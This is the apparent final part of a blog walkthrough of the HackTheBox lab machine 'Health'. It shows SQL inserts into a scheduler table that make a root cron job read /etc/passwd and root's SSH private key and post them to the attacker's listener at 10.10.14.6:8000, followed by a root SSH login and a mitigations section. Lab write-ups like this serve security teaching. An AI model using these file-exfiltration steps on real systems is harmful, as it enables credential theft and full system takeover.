</pre></td><td class="rouge-code"><pre>susanne@health:~<span class="nv">$ </span><span class="nb">cat</span> .env

...
<span class="nv">DB_HOST</span><span class="o">=</span>127.0.0.1
<span class="nv">DB_PORT</span><span class="o">=</span>3306
<span class="nv">DB_DATABASE</span><span class="o">=</span>laravel
<span class="nv">DB_USERNAME</span><span class="o">=</span>laravel
<span class="nv">DB_PASSWORD</span><span class="o">=</span>REDACTED
...
</pre></td></tr></tbody></table></code></div></div>

<p>I connected to the database, but I did not find anything of interest. There was a <code class="language-plaintext highlighter-rouge">user</code> table, but it was empty.</p>

<p>I created an SSH tunnel to take a better look at the Gogs installation and connected with susanne‚Äôs credentials. I found a <a href="https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/multi/http/gogs_git_hooks_rce">Remote Code Execution (RCE)</a> vulnerability in hooks. But I failed to exploit it. The endpoint to extract the hooks seems disabled. And my POST requests to create a new hook were all rejected.</p>

<p>I kept looking around the server. I ran <a href="https://github.com/DominicBreuker/pspy">pspy</a> and saw that <a href="https://laravel.com/docs/9.x/artisan">Artisan</a> was running as root every minute.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>2023/01/04 11:00:01 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>2384   | /bin/bash <span class="nt">-c</span> <span class="nb">cd</span> /var/www/html <span class="o">&amp;&amp;</span> php artisan schedule:run <span class="o">&gt;&gt;</span> /dev/null 2&gt;&amp;1 
</pre></td></tr></tbody></table></code></div></div>

<p>I looked at what <code class="language-plaintext highlighter-rouge">schedule:run</code> was doing.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre><span class="k">protected</span> <span class="k">function</span> <span class="n">schedule</span><span class="p">(</span><span class="kt">Schedule</span> <span class="nv">$schedule</span><span class="p">)</span>
<span class="p">{</span>
    <span class="cm">/* Get all tasks from the database */</span>
    <span class="nv">$tasks</span> <span class="o">=</span> <span class="nc">Task</span><span class="o">::</span><span class="nf">all</span><span class="p">();</span>

    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$tasks</span> <span class="k">as</span> <span class="nv">$task</span><span class="p">)</span> <span class="p">{</span>

        <span class="nv">$frequency</span> <span class="o">=</span> <span class="nv">$task</span><span class="o">-&gt;</span><span class="n">frequency</span><span class="p">;</span>

        <span class="nv">$schedule</span><span class="o">-&gt;</span><span class="nf">call</span><span class="p">(</span><span class="k">function</span> <span class="p">()</span> <span class="k">use</span> <span class="p">(</span><span class="nv">$task</span><span class="p">)</span> <span class="p">{</span>
            <span class="cm">/*  Run your task here */</span>
            <span class="nc">HealthChecker</span><span class="o">::</span><span class="nf">check</span><span class="p">(</span><span class="nv">$task</span><span class="o">-&gt;</span><span class="n">webhookUrl</span><span class="p">,</span> <span class="nv">$task</span><span class="o">-&gt;</span><span class="n">monitoredUrl</span><span class="p">,</span> <span class="nv">$task</span><span class="o">-&gt;</span><span class="n">onlyError</span><span class="p">);</span>
            <span class="nc">Log</span><span class="o">::</span><span class="nf">info</span><span class="p">(</span><span class="nv">$task</span><span class="o">-&gt;</span><span class="n">id</span> <span class="mf">.</span> <span class="s1">' '</span> <span class="mf">.</span> <span class="err">\</span><span class="nc">Carbon\Carbon</span><span class="o">::</span><span class="nf">now</span><span class="p">());</span>
        <span class="p">})</span><span class="o">-&gt;</span><span class="nf">cron</span><span class="p">(</span><span class="nv">$frequency</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>It was reading tasks from the database and sending them to <code class="language-plaintext highlighter-rouge">HeathChecker::check()</code>. I looked at the code for this.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
</pre></td><td class="rouge-code"><pre><span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="n">check</span><span class="p">(</span><span class="nv">$webhookUrl</span><span class="p">,</span> <span class="nv">$monitoredUrl</span><span class="p">,</span> <span class="nv">$onlyError</span> <span class="o">=</span> <span class="kc">false</span><span class="p">)</span>
<span class="p">{</span>
    <span class="nv">$json</span> <span class="o">=</span> <span class="p">[];</span>
    <span class="nv">$json</span><span class="p">[</span><span class="s1">'webhookUrl'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$webhookUrl</span><span class="p">;</span>
    <span class="nv">$json</span><span class="p">[</span><span class="s1">'monitoredUrl'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$monitoredUrl</span><span class="p">;</span>

    <span class="nv">$res</span> <span class="o">=</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$monitoredUrl</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$res</span><span class="p">)</span> <span class="p">{</span>

        <span class="k">if</span> <span class="p">(</span><span class="nv">$onlyError</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nv">$json</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="nv">$json</span><span class="p">[</span><span class="s1">'health'</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"up"</span><span class="p">;</span>
        <span class="nv">$json</span><span class="p">[</span><span class="s1">'body'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$res</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$http_response_header</span><span class="p">))</span> <span class="p">{</span>
        <span class="nv">$headers</span> <span class="o">=</span> <span class="p">[];</span>
        <span class="nv">$json</span><span class="p">[</span><span class="s1">'message'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$http_response_header</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>

        <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;=</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$http_response_header</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>

            <span class="nv">$split</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">':'</span><span class="p">,</span> <span class="nv">$http_response_header</span><span class="p">[</span><span class="nv">$i</span><span class="p">],</span> <span class="mi">2</span><span class="p">);</span>

            <span class="k">if</span> <span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$split</span><span class="p">)</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$headers</span><span class="p">[</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$split</span><span class="p">[</span><span class="mi">0</span><span class="p">])]</span> <span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$split</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="nb">error_log</span><span class="p">(</span><span class="s2">"invalid header pair: </span><span class="nv">$http_response_header[$i]</span><span class="se">\n</span><span class="s2">"</span><span class="p">);</span>
            <span class="p">}</span>

        <span class="p">}</span>

        <span class="nv">$json</span><span class="p">[</span><span class="s1">'headers'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$headers</span><span class="p">;</span>
        <span class="p">}</span>

    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nv">$json</span><span class="p">[</span><span class="s1">'health'</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"down"</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="nv">$content</span> <span class="o">=</span> <span class="nb">json_encode</span><span class="p">(</span><span class="nv">$json</span><span class="p">);</span>

    <span class="c1">// send</span>
    <span class="nv">$curl</span> <span class="o">=</span> <span class="nb">curl_init</span><span class="p">(</span><span class="nv">$webhookUrl</span><span class="p">);</span>
    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="no">CURLOPT_HEADER</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="no">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="no">CURLOPT_HTTPHEADER</span><span class="p">,</span>
        <span class="k">array</span><span class="p">(</span><span class="s2">"Content-type: application/json"</span><span class="p">));</span>
    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="no">CURLOPT_POST</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="no">CURLOPT_POSTFIELDS</span><span class="p">,</span> <span class="nv">$content</span><span class="p">);</span>
    <span class="nb">curl_exec</span><span class="p">(</span><span class="nv">$curl</span><span class="p">);</span>
    <span class="nb">curl_close</span><span class="p">(</span><span class="nv">$curl</span><span class="p">);</span>

    <span class="k">return</span> <span class="nv">$json</span><span class="p">;</span>

<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>It was performing the health check by reading the monitored URL with <code class="language-plaintext highlighter-rouge">file_get_contents</code> and sending the result to the webhook URL. Since I had the database credentials I could insert anything in there, bypassing the validation from the website. And the code was using <code class="language-plaintext highlighter-rouge">file_get_contents</code> to get the monitored URL, so I could use it to read local files.</p>

<p>I started by trying to read <code class="language-plaintext highlighter-rouge">/etc/passwd</code>.</p>

<div class="language-sql highlighter-rouge"><div class="code-header">
        <span data-label-text="Sql"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">Insert</span> <span class="k">Into</span> <span class="n">tasks</span> <span class="k">Values</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s1">'10.10.14.6:8000'</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">'/etc/passwd'</span><span class="p">,</span> <span class="s1">'* * * * *'</span><span class="p">,</span> <span class="n">NOW</span><span class="p">(),</span> <span class="n">NOW</span><span class="p">());</span>
<span class="n">Query</span> <span class="n">OK</span><span class="p">,</span> <span class="mi">1</span> <span class="k">row</span> <span class="n">affected</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>It worked.</p>

<div class="language-json highlighter-rouge"><div class="code-header">
        <span data-label-text="JSON"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="w">
  </span><span class="nl">"webhookUrl"</span><span class="p">:</span><span class="w"> </span><span class="s2">"10.10.14.6:8000"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"monitoredUrl"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/etc/passwd"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"health"</span><span class="p">:</span><span class="w"> </span><span class="s2">"up"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"body"</span><span class="p">:</span><span class="w"> </span><span class="s2">"root:x:0:0:root:</span><span class="se">\/</span><span class="s2">root:</span><span class="se">\/</span><span class="s2">bin</span><span class="se">\/</span><span class="s2">bash</span><span class="se">\n</span><span class="s2">daemon:x:1:1:daemon:</span><span class="se">\/</span><span class="s2">usr</span><span class="se">\/</span><span class="s2">sbin:</span><span class="se">\/</span><span class="s2">usr</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">bin:x:2:2:bin:</span><span class="se">\/</span><span class="s2">bin:</span><span class="se">\/</span><span class="s2">usr</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">sys:x:3:3:sys:</span><span class="se">\/</span><span class="s2">dev:</span><span class="se">\/</span><span class="s2">usr</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">sync:x:4:65534:sync:</span><span class="se">\/</span><span class="s2">bin:</span><span class="se">\/</span><span class="s2">bin</span><span class="se">\/</span><span class="s2">sync</span><span class="se">\n</span><span class="s2">games:x:5:60:games:</span><span class="se">\/</span><span class="s2">usr</span><span class="se">\/</span><span class="s2">games:</span><span class="se">\/</span><span class="s2">usr</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">man:x:6:12:man:</span><span class="se">\/</span><span class="s2">var</span><span class="se">\/</span><span class="s2">cache</span><span class="se">\/</span><span class="s2">man:</span><span class="se">\/</span><span class="s2">usr</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">lp:x:7:7:lp:</span><span class="se">\/</span><span class="s2">var</span><span class="se">\/</span><span class="s2">spool</span><span class="se">\/</span><span class="s2">lpd:</span><span class="se">\/</span><span class="s2">usr</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">mail:x:8:8:mail:</span><span class="se">\/</span><span class="s2">var</span><span class="se">\/</span><span class="s2">mail:</span><span class="se">\/</span><span class="s2">usr</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">news:x:9:9:news:</span><span class="se">\/</span><span class="s2">var</span><span class="se">\/</span><span class="s2">spool</span><span class="se">\/</span><span class="s2">news:</span><span class="se">\/</span><span class="s2">usr</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">uucp:x:10:10:uucp:</span><span class="se">\/</span><span class="s2">var</span><span class="se">\/</span><span class="s2">spool</span><span class="se">\/</span><span class="s2">uucp:</span><span class="se">\/</span><span class="s2">usr</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">proxy:x:13:13:proxy:</span><span class="se">\/</span><span class="s2">bin:</span><span class="se">\/</span><span class="s2">usr</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">www-data:x:33:33:www-data:</span><span class="se">\/</span><span class="s2">var</span><span class="se">\/</span><span class="s2">www:</span><span class="se">\/</span><span class="s2">usr</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">backup:x:34:34:backup:</span><span class="se">\/</span><span class="s2">var</span><span class="se">\/</span><span class="s2">backups:</span><span class="se">\/</span><span class="s2">usr</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">list:x:38:38:Mailing List Manager:</span><span class="se">\/</span><span class="s2">var</span><span class="se">\/</span><span class="s2">list:</span><span class="se">\/</span><span class="s2">usr</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">irc:x:39:39:ircd:</span><span class="se">\/</span><span class="s2">var</span><span class="se">\/</span><span class="s2">run</span><span class="se">\/</span><span class="s2">ircd:</span><span class="se">\/</span><span class="s2">usr</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">gnats:x:41:41:Gnats Bug-Reporting System (admin):</span><span class="se">\/</span><span class="s2">var</span><span class="se">\/</span><span class="s2">lib</span><span class="se">\/</span><span class="s2">gnats:</span><span class="se">\/</span><span class="s2">usr</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">nobody:x:65534:65534:nobody:</span><span class="se">\/</span><span class="s2">nonexistent:</span><span class="se">\/</span><span class="s2">usr</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">systemd-network:x:100:102:systemd Network Management,,,:</span><span class="se">\/</span><span class="s2">run</span><span class="se">\/</span><span class="s2">systemd</span><span class="se">\/</span><span class="s2">netif:</span><span class="se">\/</span><span class="s2">usr</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">systemd-resolve:x:101:103:systemd Resolver,,,:</span><span class="se">\/</span><span class="s2">run</span><span class="se">\/</span><span class="s2">systemd</span><span class="se">\/</span><span class="s2">resolve:</span><span class="se">\/</span><span class="s2">usr</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">syslog:x:102:106::</span><span class="se">\/</span><span class="s2">home</span><span class="se">\/</span><span class="s2">syslog:</span><span class="se">\/</span><span class="s2">usr</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">messagebus:x:103:107::</span><span class="se">\/</span><span class="s2">nonexistent:</span><span class="se">\/</span><span class="s2">usr</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">_apt:x:104:65534::</span><span class="se">\/</span><span class="s2">nonexistent:</span><span class="se">\/</span><span class="s2">usr</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">lxd:x:105:65534::</span><span class="se">\/</span><span class="s2">var</span><span class="se">\/</span><span class="s2">lib</span><span class="se">\/</span><span class="s2">lxd</span><span class="se">\/</span><span class="s2">:</span><span class="se">\/</span><span class="s2">bin</span><span class="se">\/</span><span class="s2">false</span><span class="se">\n</span><span class="s2">uuidd:x:106:110::</span><span class="se">\/</span><span class="s2">run</span><span class="se">\/</span><span class="s2">uuidd:</span><span class="se">\/</span><span class="s2">usr</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">dnsmasq:x:107:65534:dnsmasq,,,:</span><span class="se">\/</span><span class="s2">var</span><span class="se">\/</span><span class="s2">lib</span><span class="se">\/</span><span class="s2">misc:</span><span class="se">\/</span><span class="s2">usr</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">landscape:x:108:112::</span><span class="se">\/</span><span class="s2">var</span><span class="se">\/</span><span class="s2">lib</span><span class="se">\/</span><span class="s2">landscape:</span><span class="se">\/</span><span class="s2">usr</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">pollinate:x:109:1::</span><span class="se">\/</span><span class="s2">var</span><span class="se">\/</span><span class="s2">cache</span><span class="se">\/</span><span class="s2">pollinate:</span><span class="se">\/</span><span class="s2">bin</span><span class="se">\/</span><span class="s2">false</span><span class="se">\n</span><span class="s2">sshd:x:110:65534::</span><span class="se">\/</span><span class="s2">run</span><span class="se">\/</span><span class="s2">sshd:</span><span class="se">\/</span><span class="s2">usr</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">susanne:x:1000:1000:susanne:</span><span class="se">\/</span><span class="s2">home</span><span class="se">\/</span><span class="s2">susanne:</span><span class="se">\/</span><span class="s2">bin</span><span class="se">\/</span><span class="s2">bash</span><span class="se">\n</span><span class="s2">gogs:x:1001:1001::</span><span class="se">\/</span><span class="s2">home</span><span class="se">\/</span><span class="s2">gogs:</span><span class="se">\/</span><span class="s2">bin</span><span class="se">\/</span><span class="s2">bash</span><span class="se">\n</span><span class="s2">mysql:x:111:114:MySQL Server,,,:</span><span class="se">\/</span><span class="s2">nonexistent:</span><span class="se">\/</span><span class="s2">bin</span><span class="se">\/</span><span class="s2">false</span><span class="se">\n</span><span class="s2">"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>Next, I extracted the <code class="language-plaintext highlighter-rouge">/etc/shadow</code> file and started cracking the password.</p>

<p>While hashcat was running, I checked to see if root had an ssh key.</p>

<div class="language-sql highlighter-rouge"><div class="code-header">
        <span data-label-text="Sql"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">Insert</span> <span class="k">Into</span> <span class="n">tasks</span> <span class="k">Values</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s1">'10.10.14.6:8000'</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">'/root/.ssh/id_rsa'</span><span class="p">,</span> <span class="s1">'* * * * *'</span><span class="p">,</span> <span class="n">NOW</span><span class="p">(),</span> <span class="n">NOW</span><span class="p">());</span>
<span class="n">Query</span> <span class="n">OK</span><span class="p">,</span> <span class="mi">1</span> <span class="k">row</span> <span class="n">affected</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>They did.</p>

<div class="language-json highlighter-rouge"><div class="code-header">
        <span data-label-text="JSON"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="w">
  </span><span class="nl">"webhookUrl"</span><span class="p">:</span><span class="w"> </span><span class="s2">"10.10.14.6:8000"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"monitoredUrl"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/root/.ssh/id_rsa"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"health"</span><span class="p">:</span><span class="w"> </span><span class="s2">"up"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"body"</span><span class="p">:</span><span class="w"> </span><span class="s2">"-----BEGIN RSA PRIVATE KEY-----{KEY}-----END RSA PRIVATE KEY-----"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>I used the key to connect as root and read the flag.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">chmod </span>600 root_id_rsa 

<span class="nv">$ </span>ssh <span class="nt">-i</span> root_id_rsa root@target   
Welcome to Ubuntu 18.04.6 LTS <span class="o">(</span>GNU/Linux 4.15.0-191-generic x86_64<span class="o">)</span>

 <span class="k">*</span> Documentation:  https://help.ubuntu.com
 <span class="k">*</span> Management:     https://landscape.canonical.com
 <span class="k">*</span> Support:        https://ubuntu.com/advantage

  System information as of Wed Jan  4 11:31:32 UTC 2023

  System load:  0.0               Processes:           184
  Usage of /:   66.4% of 3.84GB   Users logged <span class="k">in</span>:     1
  Memory usage: 15%               IP address <span class="k">for </span>eth0: 10.10.11.176
  Swap usage:   0%


0 updates can be applied immediately.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


root@health:~# <span class="nb">cat </span>root.txt 
REDACTED
</pre></td></tr></tbody></table></code></div></div>

<h2 id="mitigations"><span class="mr-2">Mitigations</span><a href="#mitigations" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>There were a few issues with that box that could be fixed without too much work.</p>

<p>First, the code that read the monitored URL should not follow redirects. The code uses <code class="language-plaintext highlighter-rouge">file_get_contents</code> which follows redirection by default. I didn‚Äôt see a way from preventing it from following redirects. But it‚Äôs easy to do with curl. The code should have used curl to read the monitored URL.</p>

<p>The server was using a very old version of Gogs. The installed version is from 2014 and is beta. There is a known SQLi vulnerability in this version of Gogs. The application was not exposed to the web, but you never know if someone can find a way around that. It could be an SSRF vulnerability like in this case. Or a disgruntled employee could use it to get data they should not have access to.</p>

<p>The password stored in the database was also very weak. Hashcat was able to break it quickly.</p>

<p>The next issue is with Artisan running as root. It should have been executed as a low-privileged account. Since it was doing the same thing as the website, it should probably have run as the web server. The validations performed when posting a health check should also have been executed before performing the actions.</p>

</div>

<div class="post-tail-wrapper text-muted">

  <!-- categories -->
  

  <!-- tags -->
  
  <div class="post-tags">
    <i class="fa fa-tags fa-fw mr-1"></i>
      
      <a href="/tags/walkthrough/"
          class="post-tag no-text-decoration" >Walkthrough</a>
      
      <a href="/tags/hacking/"
          class="post-tag no-text-decoration" >Hacking</a>
      
      <a href="/tags/hackthebox/"
          class="post-tag no-text-decoration" >HackTheBox</a>
      
      <a href="/tags/medium/"
          class="post-tag no-text-decoration" >Medium</a>
      
      <a href="/tags/machine/"
          class="post-tag no-text-decoration" >Machine</a>
      
  </div>
  

  <div class="post-tail-bottom
    d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
    <div class="license-wrapper">

      

        

        This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.

      
    </div>

    <!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Share</span>
  <span class="share-icons">
    
    
    

    
      
        <a href="https://twitter.com/intent/tweet?text=Hack+The+Box+-+Health+-+Ankit+Kanojiya&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FHackTheBox-Walkthrough-Health%2F" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a>
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?title=Hack+The+Box+-+Health+-+Ankit+Kanojiya&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FHackTheBox-Walkthrough-Health%2F" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a>
    
      
        <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FHackTheBox-Walkthrough-Health%2F&text=Hack+The+Box+-+Health+-+Ankit+Kanojiya" data-toggle="tooltip" data-placement="top"
          title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
          <i class="fa-fw fab fa-telegram"></i>
        </a>
    

    <i id="copy-link" class="fa-fw fas fa-link small"
        data-toggle="tooltip" data-placement="top"
        title="Copy link"
        data-title-succeed="Link copied successfully!">
    </i>

  </span>
</div>


  </div><!-- .post-tail-bottom -->

</div><!-- div.post-tail-wrapper -->

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="ankitkanojiya" data-description="Support me on Buy me a coffee!" data-message="" data-color="#BD5FFF" data-position="Right" data-x_margin="18" data-y_margin="18"></script>

      
    
    

    </div>
  </div> <!-- #core-wrapper -->

  <!-- panel -->
  <div id="panel-wrapper" class="col-xl-3 pl-2 text-muted">

    <div class="access">
      















      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
